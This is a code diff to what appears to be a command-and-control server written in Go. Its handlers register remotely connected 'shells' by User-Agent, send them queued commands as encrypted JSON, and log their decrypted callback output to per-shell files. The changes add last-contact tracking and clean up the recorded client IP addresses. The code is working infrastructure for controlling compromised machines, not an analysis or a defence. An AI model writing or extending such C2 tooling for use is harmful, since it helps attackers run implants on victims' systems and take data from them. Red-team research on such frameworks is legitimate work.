@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"net"
 	"net/http"
 	"os"
 	"strings"
@@ -42,7 +43,11 @@ func (l *Listener) CallBackHandler(w http.ResponseWriter, r *http.Request) {
 	}
 	defer f.Close()
 
-	timestamp := time.Now().Format(time.RFC3339) // You can format this as you like
+	timestamp := time.Now().Format(time.RFC3339)
+	if shell, err := ShellMap.Get(id); shell != nil && err == nil {
+		shell.LCall = time.Now()
+	}
+
 	_, err = f.WriteString(fmt.Sprintf("%s\n%s\n", timestamp, string(decryptedBody)))
 	if err != nil {
 		fmt.Printf("Failed to write to file: %s\n", err)
@@ -59,14 +64,17 @@ func (l *Listener) CallBackHandler(w http.ResponseWriter, r *http.Request) {
 func (l *Listener) GetTasksHandler(w http.ResponseWriter, r *http.Request) {
 	id := r.Header.Get("User-Agent")
 	if shell, err := ShellMap.Get(id); shell == nil && err != nil {
+		host, _, _ := net.SplitHostPort(r.RemoteAddr)
 		newShell := &Shell{
-			Id:   id,
-			Ip:   r.RemoteAddr,
-			Cmds: nil,
+			Id:    id,
+			Ip:    host,
+			LCall: time.Now(),
+			Cmds:  nil,
 		}
 		ShellMap.Add(newShell)
 		os.Create(fmt.Sprintf("c2/data/%s.log", id))
 	} else if shell != nil && shell.Cmds != nil {
+		shell.LCall = time.Now()
 		json, err := json.Marshal(shell.Cmds)
 		if err != nil {
 			return
@@ -77,6 +85,9 @@ func (l *Listener) GetTasksHandler(w http.ResponseWriter, r *http.Request) {
 		}
 		ShellMap.ClearCmds(id)
 		w.Write(encJson)
+	} else if shell != nil {
+		shell.LCall = time.Now()
+		w.Write(nil)
 	} else {
 		w.Write(nil)
 	}
